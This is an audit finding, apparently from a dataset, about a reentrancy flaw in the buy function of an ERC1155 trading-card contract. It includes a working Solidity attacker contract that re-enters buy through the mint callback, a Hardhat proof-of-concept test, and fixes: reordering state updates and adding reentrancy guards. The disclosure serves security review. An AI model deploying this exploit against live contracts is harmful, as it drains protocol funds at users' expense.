# [H] Malicious users can drain the contract's funds

## Summary
Severity: High
Contest weight: 0.7866
Dataset id: 22766
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
A reentrancy vulnerability in the buy function allows a malicious user to purchase
multiple cards at a reduced price, exploiting the pricing sequence that depends on
card supply.
The price of a card depends on the current supply that card has. Specifically, the
price grows using the following arithmetic sequence: (1, 2, 4, 7, 11, ...). The
price of the first card after the release is 1 and the price of the second card after
the release is 2. So, if you want to buy the first two cards after the release you will
need to pay 3. However, by reentering the buy function, a malicious user can buy as
many cards as he wants (up to the gas limit) at the price of the first card that is
buying, that is, without incrementing the price of the subsequent cards. The
reentrancy is possible because the _mint function of the ERC1155 contract makes a
callback to the receiver.
To showcase the issue, the following coded POC is based on the most simple case.
The attacker contract wants to buy the first two cards after the release, which
means that it will need to pay a price of 3 (multiplied by the base price). But, it will
end up paying only 2.
Under contracts.Reentrancy_Attack.sol paste the following contract (it performs
the attack):
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface Uncuts {
    function buy(address to, uint256 id, uint256 amount, uint256 maxSpentLimit)
    external returns(uint256, uint256, uint256, uint256);
}

contract Reentrancy_Attack is ERC1155Holder {
    Uncuts public uncuts_contract;
    ERC20 public payToken;
    bool public reentrant;

    constructor(address _uncutsContract, address _payToken) {
        uncuts_contract = Uncuts(_uncutsContract);
        payToken = ERC20(_payToken);
        payToken.approve(_uncutsContract, type(uint256).max);
    }

    function buy_card(uint256 id, uint256 amount, uint256 maxSpentLimit) external {
        uncuts_contract.buy(address(this), id, amount, maxSpentLimit);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        if (!reentrant) {
            reentrant = true;
            uncuts_contract.buy(address(this), 1, 1, type(uint256).max);
        }
        return this.onERC1155Received.selector;
    }
}
```
Then, paste the following test:
```solidity
it.only("Should buy two cards with reentrancy", async function () {
    const {
        uncutsTradingCard,
        payToken,
        otherAccount,
        protocolReleaseCardFee
    } = await loadFixture(deployTradingCardFixture);

    // Deploy attacker contract.
    const attack_contract = await ethers.deployContract("Reentrancy_Attack", [
        uncutsTradingCard.target,
        payToken.target,
    ]);

    // The first card is released.
    await uncutsTradingCard.releaseCardTo(otherAccount.address);

    // Prices for buying the first card after the release.
    const priceWithoutFeesOneCard = await uncutsTradingCard.getBuyPrice(1,1);
    const priceWithFeesOneCard = await
    uncutsTradingCard.getBuyPriceAfterFee(1,1);

    // The price of buying the first two cards after the release. Do no take
    into account fees since they do not stay in the uncuts contract.
    const priceWithoutFeesTwoCards = await uncutsTradingCard.getBuyPrice(1,2);

    // Fund the attacker contract with only twice the price (with fees) for
    the first card.
    payToken.transfer(attack_contract.target,
    BigInt(Number(priceWithFeesOneCard)*2));

    // Perform the attack.
    await attack_contract.buy_card(1, 1, priceWithFeesOneCard);

    // Attacker contract ended up buying 2 cards.
    const balanceAttackContract = await
    uncutsTradingCard.balanceOf(attack_contract.target, 1);
    expect(balanceAttackContract).to.equal(2);

    // Uncuts contract only received the price for the first card twice.
    // (1 + 1) instead of (1 + 2) as per the bonding curve.
    const tokenBalanceUncutContract = await
    payToken.balanceOf(uncutsTradingCard.target);
    expect(tokenBalanceUncutContract).to.equal(priceWithoutFeesOneCard +
    priceWithoutFeesOneCard);

    console.log('Price for 2 cards after release: ' +
    priceWithoutFeesTwoCards);
    console.log('Amount paid to uncuts contract:
    ' +
    tokenBalanceUncutContract);
})
```
Users can buy cards at discounted prices which has the consequence of allowing
the attacker to make a profit by selling the cards at their real prices at the expense
of the contract's funds.

## Recommendation
• Rearrange the order of operations in the buy function, ensuring that the _mint
call occurs after all state updates.
• Implement reentrancy guards.
